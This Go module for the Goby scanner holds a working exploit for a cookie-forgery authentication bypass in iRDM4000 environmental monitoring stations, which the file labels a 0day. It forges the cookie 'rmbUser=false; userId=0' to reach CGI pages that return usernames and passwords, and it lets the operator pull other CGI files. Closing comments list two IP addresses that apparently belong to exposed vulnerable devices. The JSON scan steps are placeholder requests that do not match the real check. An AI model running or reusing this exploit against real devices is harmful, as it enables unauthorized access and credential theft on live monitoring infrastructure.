package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "iRDM4000 cookie bypass",
    "Description": "<p>Hebei Huahou Tiancheng Environmental Technology Co., Ltd. is a professional manufacturer of environmental online monitoring equipment and a leading environmental monitoring system integrator.</p><p>The iRDM4000 smart station room online supervision, diagnosis and configuration sub-station has cookie forgery, which leads to malicious login to the operation background.</p>",
    "Product": "iRDM4000",
    "Homepage": "http://www.houtian-hb.com",
    "DisclosureDate": "2021-09-22",
    "Author": "1291904552@qq.com",
    "FofaQuery": "body=\"iRDM4000\"",
    "GobyQuery": "body=\"iRDM4000\"",
    "Level": "2",
    "Impact": "<p>iRDM4000 smart station room online supervision, diagnosis and configuration sub-stations have cookie forgery, attackers can log in to the operation background maliciously.</p>",
    "Translation": {
        "CN": {
            "Name": "iRDM4000 智慧站房 cookie 伪造 权限绕过漏洞",
            "VulType": [
                "权限绕过"
            ],
            "Description": "<p>河北华厚天成环保技术有限公司是专业的环境在线监测仪器制造商、领先的环境监控系统集成商。</p><p>iRDM4000智慧站房在线监管、诊断与配置子站存在cookie伪造，攻击者可恶意登陆操作后台。</p>",
            "Impact": "<p>iRDM4000智慧站房在线监管、诊断与配置子站存在cookie伪造，攻击者可恶意登陆操作后台。</p>",
            "Product": "iRDM4000",
            "Recommendation": "<p>厂商暂未提供修复方案，请关注厂商网站及时更新: <a href=\"http://www.houtian-hb.com/\">http://www.houtian-hb.com/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "iRDM4000 cookie bypass",
            "VulType": [
                "Permission Bypass"
            ],
            "Description": "<p>Hebei Huahou Tiancheng Environmental Technology Co., Ltd. is a professional manufacturer of environmental online monitoring equipment and a leading environmental monitoring system integrator.</p><p>The iRDM4000 smart station room online supervision, diagnosis and configuration sub-station has cookie forgery, which leads to malicious login to the operation background.</p>",
            "Impact": "<p>iRDM4000 smart station room online supervision, diagnosis and configuration sub-stations have cookie forgery, attackers can log in to the operation background maliciously.</p>",
            "Product": "iRDM4000",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"http://www.houtian-hb.com/\">http://www.houtian-hb.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filepath",
            "type": "createSelect",
            "value": "dhInfoSet.cgi,httpUrlList.cgi,readWanInfo.cgi"
        }
    ],
    "ExpTips": null,
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [],
    "CVSSScore": "7.8",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": [
            "iRDM4000"
        ]
    },
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"http://www.houtian-hb.com/\">http://www.houtian-hb.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "CNNVD": [],
    "CNVD": [],
    "Is0day": true,
    "PocId": "10227"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/cgi-bin/deviceBasicInfo.cgi?0.8258190131650356"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.Header.Store("Cookie","rmbUser=false; userId=0")
			cfg1.Data=` `
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				if resp1.StatusCode == 200 && strings.Contains(resp1.RawBody,"upVersion")&& strings.Contains(resp1.RawBody,"true"){
					return true
				}
			}
			uri2 := "/cgi-bin/dhInfoSet.cgi"
			cfg2 := httpclient.NewPostRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.Header.Store("Cookie","rmbUser=false; userId=0")
			cfg2.Data=`data=`
			if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
				if resp2.StatusCode == 200 && strings.Contains(resp2.RawBody,"userName")&& strings.Contains(resp2.RawBody,"password"){
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["filepath"].(string)
			uri := "/cgi-bin/"+cmd
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.Header.Store("Cookie","rmbUser=false; userId=0")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
//http://222.223.251.116:8001
//http://123.182.230.38:8002/
